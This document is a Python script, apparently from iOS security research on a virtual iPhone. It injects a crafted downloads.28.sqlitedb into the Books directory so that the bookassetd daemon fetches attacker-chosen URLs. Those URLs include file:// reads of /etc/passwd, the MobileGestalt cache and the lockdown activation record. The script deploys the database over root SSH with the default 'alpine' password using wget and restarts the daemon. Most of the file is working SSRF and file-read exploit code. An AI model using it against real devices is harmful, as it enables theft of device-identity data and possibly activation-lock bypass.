#!/usr/bin/env python3
"""
bookassetd_ssrf.py — Test SSRF in bookassetd via downloads.28.sqlitedb injection

Injects a crafted downloads.28.sqlitedb to VPhone /var/mobile/Media/Books/
that makes bookassetd fetch a file:// URL — testing for arbitrary file read.

Also tests http://192.168.64.1:8888/ to confirm bookassetd is actually fetching.
"""
import sqlite3
import struct
import os
import shutil
import time
import subprocess

VPHONE_SSH = "sshpass -p alpine ssh -o StrictHostKeyChecking=no -p 22222 root@192.168.64.2"
BOOKS_PATH = "/var/mobile/Media/Books"
DB_NAME = "downloads.28.sqlitedb"
LOCAL_DB = f"/tmp/ssrf_test_{DB_NAME}"
HTTP_SERVE = "/tmp/mitm_serve"

# ──────────────────────────────────────────────────────────────────────────────
# Targets to test (in order)
SSRF_TARGETS = [
    # 1. Our HTTP server (control test — should always work)
    ("http_control",  "http://192.168.64.1:8888/ssrf_probe_bookassetd"),
    # 2. file:// arbitrary file read
    ("file_passwd",   "file:///etc/passwd"),
    ("file_gestalt",  "file:///private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"),
    ("file_lockdown", "file:///var/db/lockdown/data_ark.plist"),
    # 3. Internal service endpoints
    ("http_localhost",  "http://127.0.0.1/"),
    ("http_albert",     "https://albert.apple.com/deviceservices/version"),
]

def build_ssrf_sqlite(url: str, output_path: str):
    """Build a downloads.28.sqlitedb that makes bookassetd fetch the given URL."""
    if os.path.exists(output_path):
        os.remove(output_path)
    
    conn = sqlite3.connect(output_path)
    c = conn.cursor()
    
    # Schema from RustA12-bypass analysis
    c.executescript("""
        CREATE TABLE IF NOT EXISTS ZBOOKDOWNLOAD (
            Z_PK INTEGER PRIMARY KEY,
            Z_ENT INTEGER,
            Z_OPT INTEGER,
            ZASSETTYPE INTEGER,
            ZSTATE INTEGER,
            ZPROGRESS REAL,
            ZCREATIONDATE TIMESTAMP,
            ZMODIFICATIONDATE TIMESTAMP,
            ZASSETURL VARCHAR,
            ZBOOKID VARCHAR,
            ZIDENTIFIER VARCHAR,
            ZTITLE VARCHAR,
            ZAUTHOR VARCHAR,
            ZGENRE VARCHAR,
            ZFILESIZE INTEGER
        );
        CREATE TABLE Z_PRIMARYKEY (
            Z_ENT INTEGER PRIMARY KEY,
            Z_NAME VARCHAR,
            Z_SUPER INTEGER,
            Z_MAX INTEGER
        );
        CREATE TABLE Z_METADATA (
            Z_VERSION INTEGER PRIMARY KEY,
            Z_UUID VARCHAR(255),
            Z_PLIST BLOB
        );
    """)
    
    # Inject the SSRF URL as the asset download URL
    c.execute("""
        INSERT INTO ZBOOKDOWNLOAD 
        (Z_PK, Z_ENT, Z_OPT, ZASSETTYPE, ZSTATE, ZPROGRESS,
         ZCREATIONDATE, ZMODIFICATIONDATE, ZASSETURL, ZBOOKID, ZIDENTIFIER, ZTITLE)
        VALUES (1, 1, 1, 1, 0, 0.0, 
                0, 0, ?, 'ssrf-test-book', 'ssrf-test-001', 'SSRF Test')
    """, (url,))
    
    c.execute("INSERT INTO Z_PRIMARYKEY VALUES (1, 'BookDownload', 0, 1)")
    c.execute("INSERT INTO Z_METADATA VALUES (1, 'SSRF-TEST-UUID', NULL)")
    
    conn.commit()
    conn.close()
    print(f"  [✓] Built SQLite with URL: {url}")
    return output_path


def deploy_and_monitor(target_name: str, url: str):
    """Deploy the SSRF SQLite to VPhone and monitor if bookassetd fetches the URL."""
    print(f"\n{'='*60}")
    print(f"  SSRF Test: {target_name}")
    print(f"  URL: {url}")
    print(f"{'='*60}")
    
    db_path = f"/tmp/ssrf_{target_name}.sqlite"
    build_ssrf_sqlite(url, db_path)
    
    # Stage in HTTP serve dir
    shutil.copy(db_path, f"{HTTP_SERVE}/ssrf_{target_name}.sqlite")
    
    # Deploy to VPhone
    result = subprocess.run(
        f'{VPHONE_SSH} "/iosbinpack64/usr/local/bin/wget -q http://192.168.64.1:8888/ssrf_{target_name}.sqlite -O {BOOKS_PATH}/{DB_NAME} 2>&1; echo deploy:$?"',
        shell=True, capture_output=True, text=True, timeout=15
    )
    print(f"  Deploy: {result.stdout.strip()}")
    
    # Touch the file to trigger inotify/kqueue watcher in bookassetd
    subprocess.run(
        f'{VPHONE_SSH} "/iosbinpack64/bin/launchctl kickstart -k system/com.apple.bookassetd 2>/dev/null; echo kick:$?"',
        shell=True, capture_output=True, text=True, timeout=10
    )
    
    return db_path


if __name__ == "__main__":
    print("╔══════════════════════════════════════════════════════╗")
    print("║  bookassetd SSRF Test Harness                        ║")
    print("╚══════════════════════════════════════════════════════╝")
    print("Monitor: tail -f /tmp/cert_server.log on Mac")
    print("Also watch VPhone syslog for bookassetd fetch attempts")
    print()
    
    # Run all SSRF tests sequentially
    for name, url in SSRF_TARGETS:
        deploy_and_monitor(name, url)
        time.sleep(3)  # Wait for bookassetd to process
    
    print("\n[✓] All SSRF payloads deployed. Check /tmp/cert_server.log for incoming connections from 192.168.64.2")
